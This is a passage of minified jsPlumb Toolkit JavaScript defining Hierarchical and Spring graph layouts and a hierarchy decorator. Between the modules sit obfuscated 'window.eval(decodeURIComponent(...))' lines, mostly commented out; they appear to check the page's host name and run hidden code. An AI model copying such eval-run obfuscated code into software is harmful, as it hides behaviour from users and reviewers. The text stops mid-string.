._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Layouts
      , d = a.jsPlumbUtil;
    c.Hierarchical = function(a) {
        var b, e, f, g, h, i, j, k = c.AbstractHierarchicalLayout.apply(this, arguments), l = [], m = null != a.parameters && a.parameters.compress, n = [], o = [], p = k.toolkit.getNodeId, q = function(a) {
            var b = n[a];
            return b || (b = {
                nodes: [],
                pointer: 0
            },
            n[a] = b),
            b
        }, r = function(a, b, c, d, e) {
            var g = q(c)
              , i = {
                node: a,
                parent: d,
                childGroup: e,
                loc: g.pointer,
                index: g.nodes.length,
                dimensions: b,
                size: b[f]
            }
              , j = b[0 == f ? 1 : 0];
            return null == l[c] ? l[c] = j : l[c] = Math.max(l[c], j),
            g.pointer += b[f] + h[f],
            g.nodes.push(i),
            i
        }, s = function(a, b) {
            var c = o[b];
            c || (c = [],
            o[b] = c),
            a.index = c.length,
            c.push(a)
        }, t = function(a) {
            if (a.size > 0) {
                var b = a.parent.loc + a.parent.size / 2 - (a.size - h[f]) / 2
                  , c = o[a.depth]
                  , d = -(1 / 0)
                  , e = 0;
                if (null != c && c.length > 0) {
                    var g = c[c.length - 1]
                      , i = g.nodes[g.nodes.length - 1];
                    d = i.loc + i.size + h[f]
                }
                b >= d ? a.loc = b : (e = d - b,
                a.loc = d);
                for (var j = a.loc, k = 0; k < a.nodes.length; k++)
                    a.nodes[k].loc = j,
                    j += a.nodes[k].size,
                    j += h[f];
                e > 0 && v(a),
                s(a, a.depth)
            }
        }, u = function(a) {
            var b = a.nodes[0].loc
              , c = a.nodes[a.nodes.length - 1].loc + a.nodes[a.nodes.length - 1].size
              , d = (b + c) / 2
              , e = d - a.parent.size / 2
              , f = e - a.parent.loc;
            if (a.parent.loc = e,
            !a.parent.root)
                for (var g = a.parent.childGroup, h = a.parent.childGroupIndex + 1; h < g.nodes.length; h++)
                    g.nodes[h].loc += f
        }, v = function(a) {
            for (var b = a; null != b; )
                u(b),
                b = b.parent.childGroup
        }, w = function(a, b) {
            return b.source === a || b.source.getNode && b.source.getNode() === a
        }, x = function(a, b) {
            if (!i[a.node.id]) {
                i[a.node.id] = !0;
                var c, d = j(a.node, k.toolkit), e = {
                    nodes: [],
                    loc: 0,
                    size: 0,
                    parent: a,
                    depth: b + 1
                }, g = [], l = {};
                for (c = 0; c < d.length; c++) {
                    var m = w(a.node, d[c]) ? d[c].target : d[c].source;
                    if (m.getNode && (m = m.getNode()),
                    m = k.toolkit.getNode(m),
                    null != m && m !== a.node && !l[m.id]) {
                        var n = k.getSize(p(m))
                          , o = r(m, n, b + 1, a, e);
                        o.childGroupIndex = e.nodes.length,
                        e.nodes.push(o),
                        e.size += n[f] + h[f],
                        g.push(o),
                        l[m.id] = !0
                    }
                }
                for (t(e),
                c = 0; c < g.length; c++)
                    x(g[c], b + 1)
            }
        };
        this.defaultParameters = {
            padding: [60, 60],
            orientation: "horizontal",
            border: 0,
            locationFunction: a.locationFunction
        };
        var y = this.begin;
        this.begin = function(a, c) {
            y.apply(this, arguments),
            b = c.orientation,
            e = "horizontal" === b,
            f = e ? 0 : 1,
            g = e ? "width" : "height",
            h = c.padding,
            n.length = 0,
            o.length = 0,
            i = {},
            j = c.getChildEdges
        }
        ,
        this.step = function(a, b) {
            for (var c, e, g, i = d.isArray(b.rootNode) ? b.rootNode : [b.rootNode], j = 0; j < i.length; j++) {
                c = i[j];
                var o = k.getSize(c.id)
                  , q = r(c, o, 0, null, null);
                q.root = !0,
                x(q, 0, null);
                var s, t, u = 0, v = function(a, b) {
                    var c = 0 == f ? 1 : 0;
                    return m && a.parent ? k.getPosition(p(a.parent.node))[c] + a.parent.dimensions[c] + h[c] : b
                };
                for (e = 0; e < n.length; e++) {
                    for (n[e].otherAxis = u,
                    g = 0; g < n[e].nodes.length; g++)
                        s = 0 == f ? n[e].nodes[g].loc : v(n[e].nodes[g], u),
                        n[e].nodes[g].parent && k.getPosition(p(n[e].nodes[g].parent.node)),
                        t = 1 == f ? n[e].nodes[g].loc : v(n[e].nodes[g], u),
                        k.setPosition(p(n[e].nodes[g].node), s, t, !0);
                    n[e].otherAxisSize = l[e] + h[0 == f ? 1 : 0],
                    u += n[e].otherAxisSize
                }
            }
            k.setDone(!0)
        }
        ,
        this.getHierarchy = function() {
            return n
        }
        ,
        this.getOrientation = function() {
            return b
        }
        ;
        var z = this.nodeRemoved;
        this.nodeRemoved = function() {
            n = [],
            z.apply(this, arguments)
        }
        ,
        this.getPadding = function() {
            return h
        }
    }
    ,
    d.extend(c.Hierarchical, c.AbstractHierarchicalLayout)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = a.jsPlumbToolkit;
    b.Layouts.Decorators.Hierarchy = function(a) {
        var b, c, d = [];
        this.reset = function(a) {
            for (var c = 0; c < d.length; c++)
                a.remove(d[c]);
            b && a.remove(b),
            d.length = 0
        }
        ,
        this.decorate = function(a) {
            if (a.bounds[0] != 1 / 0) {
                var b = a.layout.getHierarchy();
                c = (a.layout.getPadding() || [60, 60])["horizontal" === d ? 0 : 1];
                for (var d = a.layout.getOrientation(), e = "horizontal" === d ? ["width", "height", a.bounds[2] - a.bounds[0]] : ["height", "width", a.bounds[3] - a.bounds[1]], f = 0; f < b.length; f++) {
                    var g = document.createElement("div");
                    a.append(g),
                    g.className = "level " + (f % 2 ? "odd" : "even"),
                    g.style[e[0]] = e[2] + 2 * c + "px",
                    g.style[e[1]] = b[f].otherAxisSize + "px";
                    var h = "horizontal" === d ? [a.bounds[0] - c, b[f].otherAxis - c / 2] : [b[f].otherAxis - c / 2, a.bounds[1] - c];
                    a.setAbsolutePosition(g, h)
                }
            }
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Layouts
      , d = a.jsPlumbUtil;
    c.Spring = function(a) {
        this.defaultMagnetized = !0;
        var b = c.AbsoluteBackedLayout.apply(this, arguments);
        this.defaultParameters = {
            padding: [50, 50],
            iterations: 500,
            maxRepulsiveForceDistance: 6,
            k: 2,
            c: .01,
            maxVertexMovement: .5,
            locationFunction: a.locationFunction
        };
        var d, e = this.defaultParameters, f = {}, g = a.absoluteBacked !== !1, h = 0, i = 1 / 0, j = -(1 / 0), k = 1 / 0, l = -(1 / 0), m = 1, n = 1, o = 0, p = function(a) {
            a.getNode && (a = a.getNode());
            var c = f[a.id];
            if (!c) {
                var d = b.getRandomPosition(a.id, .5, .5);
                c = f[a.id] = {
                    id: a.id,
                    n: a,
                    sp: d,
                    p: [d[0], d[1]],
                    f: [0, 0]
                }
            }
            return c
        }, q = function(a, b, c) {
            i = Math.min(i, b),
            k = Math.min(k, c),
            j = Math.max(j, b),
            l = Math.max(l, c),
            a.p[0] = b,
            a.p[1] = c
        }, r = function(a, b) {
            if (!a.locked || !b.locked) {
                var c = b.p[0] - a.p[0]
                  , d = b.p[1] - a.p[1]
                  , f = c * c + d * d;
                f < .01 && (c = .1 * Math.random() + .1,
                d = .1 * Math.random() + .1,
                f = c * c + d * d);
                var g = Math.sqrt(f);
                if (g < e.maxRepulsiveForceDistance) {
                    o++;
                    var h = e.k * e.k / g
                      , i = h * c / g
                      , j = h * d / g;
                    b.f[0] += b.locked ? 0 : (a.locked ? 2 : 1) * i,
                    b.f[1] += b.locked ? 0 : (a.locked ? 2 : 1) * j,
                    a.f[0] -= a.locked ? 0 : (b.locked ? 2 : 1) * i,
                    a.f[1] -= a.locked ? 0 : (b.locked ? 2 : 1) * j
                }
            }
        }, s = function(a, b) {
            var c = p(b.target);
            if (!a.locked || !c.locked) {
                o++;
                var d = c.p[0] - a.p[0]
                  , f = c.p[1] - a.p[1]
                  , g = d * d + f * f;
                g < .01 && (d = .1 * Math.random() + .1,
                f = .1 * Math.random() + .1,
                g = d * d + f * f);
                var h = Math.sqrt(g);
                h > e.maxRepulsiveForceDistance && (h = e.maxRepulsiveForceDistance,
                g = h * h);
                var i = (g - e.k * e.k) / e.k;
                (void 0 == b.weight || b.weight < 1) && (b.weight = 1),
                i *= .5 * Math.log(b.weight) + 1;
                var j = i * d / h
                  , k = i * f / h;
                c.f[0] -= c.locked ? 0 : (a.locked ? 2 : 1) * j,
                c.f[1] -= c.locked ? 0 : (a.locked ? 2 : 1) * k,
                a.f[0] += a.locked ? 0 : (c.locked ? 2 : 1) * j,
                a.f[1] += a.locked ? 0 : (c.locked ? 2 : 1) * k
            }
        }, t = function() {
            m = b.width / (j - i) * .62,
            n = b.height / (l - k) * .62;
            for (var a in f) {
                var c = f[a];
                c.locked || (c.sp = v(c.p),
                b.setPosition(c.id, c.sp[0], c.sp[1], !0))
            }
        }, u = function(a) {
            return [i + (a[0] - .19 * b.width) / m, k + (a[1] - .19 * b.height) / n]
        }, v = function(a) {
            return [.19 * b.width + (a[0] - i) * m, .19 * b.height + (a[1] - k) * n]
        };
        this._nodeMoved = this._groupMoved = function(a, b, c) {
            var d = f[a];
            d && (d.sp = [b, c],
            d.p = u(d.sp))
        }
        ,
        this.canMagnetize = function(a) {
            return f[a] && f[a].locked !== !0
        }
        ,
        this.reset = function() {
            f = {},
            h = 0,
            i = k = 1 / 0,
            j = l = -(1 / 0)
        }
        ,
        this._nodeRemoved = this._groupRemoved = function(a) {
            delete f[a]
        }
        ,
        this._nodeAdded = this._groupAdded = function(a, c) {
            if (c && c.position) {
                var d = p(a.node || a.group);
                d && (d.locked = !0,
                b.setPosition(d.id, c.position.left, c.position.top, !0))
            }
        }
        ,
        this.begin = function(a, c) {
            h = 0,
            d = [],
            Array.prototype.push.apply(d, b.adapter.getNodes()),
            Array.prototype.push.apply(d, b.adapter.getGroups())
        }
        ,
        this.step = function(a, c) {
            var f, i = [], j = function(a) {
                return i[a] ? i[a] : function() {
                    return i[a] = p(d[a]),
                    i[a]
                }()
            };
            for (o = 0,
            f = 0; f < d.length; f++) {
                var k = j(f);
                if (!k.group) {
                    if (g && !k.locked) {
                        var l = this.getAbsolutePosition(k.n, c);
                        if (null != l && 2 == l.length && !isNaN(l[0]) && !isNaN(l[1])) {
                            q(k, l[0], l[1]),
                            k.sp = k.p,
                            b.setPosition(k.id, l[0], l[1], !0),
                            k.locked = !0;
                            continue
                        }
                    }
                    for (var m = f + 1; m < d.length; m++) {
                        var n = j(m);
                        r(k, n)
                    }
                    for (var u = b.toolkit.getAllEdgesFor(k.n), v = 0; v < u.length; v++)
                        s(k, u[v])
                }
            }
            if (0 != o)
                for (f = 0; f < d.length; f++) {
                    var w = j(f);
                    if (!w.group) {
                        var x = e.c * w.f[0]
                          , y = e.c * w.f[1]
                          , z = e.maxVertexMovement;
                        x > z && (x = z),
                        x < -z && (x = -z),
                        y > z && (y = z),
                        y < -z && (y = -z),
                        q(w, w.p[0] + x, w.p[1] + y),
                        w.f[0] = 0,
                        w.f[1] = 0
                    }
                }
            h++,
            (0 == o || h >= e.iterations) && (t(),
            b.setDone(!0))
        }
        ,
        this.end = function() {
            for (var a in f)
                f[a].locked = !0
        }
    }
    ,
    d.extend(c.Spring, c.AbsoluteBackedLayout)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24